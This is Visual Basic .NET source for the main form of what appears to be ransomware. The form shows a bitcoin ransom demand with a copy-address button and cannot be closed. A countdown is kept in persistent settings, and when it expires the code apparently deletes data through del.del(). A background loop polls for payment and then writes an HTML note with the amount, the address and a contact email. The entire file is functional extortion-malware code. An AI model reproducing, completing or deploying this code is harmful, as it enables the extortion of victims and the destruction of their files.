﻿Public Class Form1
    Dim hour As Double
    Dim minute As Double
    Dim second As Double
    Dim h As Object = GetSetting("H", "0", St.Setting)
    Dim m As Object = GetSetting("M", "0", St.Setting)
    Dim s As Object = GetSetting("S", "0", St.Setting)
    Dim P As Object = GetSetting("P", "0", St.Setting)
    Dim mx As Object = GetSetting("X", "0", St.Setting)

    Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles PictureBox1.Click

    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Try
            Clipboard.SetText(TextBox1.Text)
            MessageBox.Show("Copied To Clipboard")
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try

    End Sub


    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Try
            Label1.Text = "Send $" & St.amount & " worth of bitcoin to this address:"
            TextBox1.Text = St.btc
            If h = Nothing Then
                SaveSetting("H", "0", St.Setting, St.H)
                hour = GetSetting("H", "0", St.Setting)
                Dim progbar As Integer = GetSetting("H", "0", St.Setting)
                ProgressBar1.Maximum = progbar
            Else
                hour = GetSetting("H", "0", St.Setting)
            End If



            If m = Nothing Then
                SaveSetting("M", "0", St.Setting, St.m)
                minute = GetSetting("M", "0", St.Setting)
            Else
                minute = GetSetting("M", "0", St.Setting)
            End If


            If s = Nothing Then
                SaveSetting("S", "0", St.Setting, 59)
                second = GetSetting("S", "0", St.Setting)
            Else
                second = GetSetting("S", "0", St.Setting)
            End If

            If P = Nothing Then
                SaveSetting("P", "0", St.Setting, 0)
                Dim prog1 As Integer = GetSetting("P", "0", St.Setting)
                ProgressBar1.Value = prog1
            Else
                Dim prog2 As Integer = GetSetting("P", "0", St.Setting)
                ProgressBar1.Value = prog2
            End If

            If mx = Nothing Then
                SaveSetting("X", "0", St.Setting, St.H)
                Dim prog1 As Integer = GetSetting("X", "0", St.Setting)
                ProgressBar1.Maximum = prog1
            Else
                Dim prog2 As Integer = GetSetting("X", "0", St.Setting)
                ProgressBar1.Maximum = prog2
            End If

            Timer1.Start()
        Catch ex As Exception

        End Try

    End Sub

    Private Sub LinkLabel2_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles LinkLabel2.LinkClicked
        Process.Start("https://www.google.com/search?q=how+to+buy+bitcoin")
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs)
        Form2.Show()
    End Sub

    Private Sub Button1_Click_1(sender As Object, e As EventArgs) Handles Button1.Click
        Dim f2 As New Form2
        f2.StartPosition = FormStartPosition.CenterParent
        f2.ShowDialog()
    End Sub

    Private Sub LinkLabel1_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles LinkLabel1.LinkClicked
        Dim f3 As New Form3
        f3.StartPosition = FormStartPosition.CenterParent
        f3.ShowDialog()
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Dim f4 As New Form4
        f4.StartPosition = FormStartPosition.CenterParent
        f4.ShowDialog()
    End Sub

    Private Sub LinkLabel3_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles LinkLabel3.LinkClicked
        Process.Start("https://en.wikipedia.org/wiki/Bitcoin")
    End Sub
    Protected Overrides ReadOnly Property CreateParams() As CreateParams
        Get
            Dim cp As CreateParams = MyBase.CreateParams
            Const CS_NOCLOSE As Integer = &H200
            cp.ClassStyle = cp.ClassStyle Or CS_NOCLOSE
            Return cp
        End Get
    End Property

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            If hour = 0 And minute = 0 Then
                Label9.Text = "0"
                Label7.Text = "0"
                Timer1.Stop()
                Me.Hide()
                SaveSetting("D", "0", St.Setting, "OK")
                del.del()
            Else
                Label9.Text = hour

                Label7.Text = minute
                SaveSetting("H", "0", St.Setting, hour) ' update Setting
                SaveSetting("M", "0", St.Setting, minute)
                SaveSetting("S", "0", St.Setting, second)
            End If





            If minute = 0 Then
                hour = hour - 1
                minute = 59
                ProgressBar1.Increment(1)
                SaveSetting("P", "0", St.Setting, ProgressBar1.Value)
            ElseIf second = 0 Then
                minute = minute - 1
                second = 59

            Else
                second = second - 1

            End If

        Catch ex As Exception

        End Try


    End Sub

    Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
        Do While True
            Threading.Thread.Sleep(2000)
            If sends(St.hash) Then
                SaveSetting("F", "0", St.Setting, "Done")
                SaveSetting("C", "0", St.Setting, "Done")

                Dim stb As String = My.Resources.html
                stb = stb.Replace("%M%", "$" & St.amount)
                stb = stb.Replace("%BTC%", St.btc)
                stb = stb.Replace("%Email%", St.email)

                Dim objWriter As New System.IO.StreamWriter(St.html, False)
                objWriter.WriteLine(stb)
                objWriter.Close()

                If BackgroundWorker1.IsBusy Then

                    If BackgroundWorker1.WorkerSupportsCancellation Then

                        BackgroundWorker1.CancelAsync()

                    End If

                End If
                Exit Do
            End If
        Loop
    End Sub
End Class
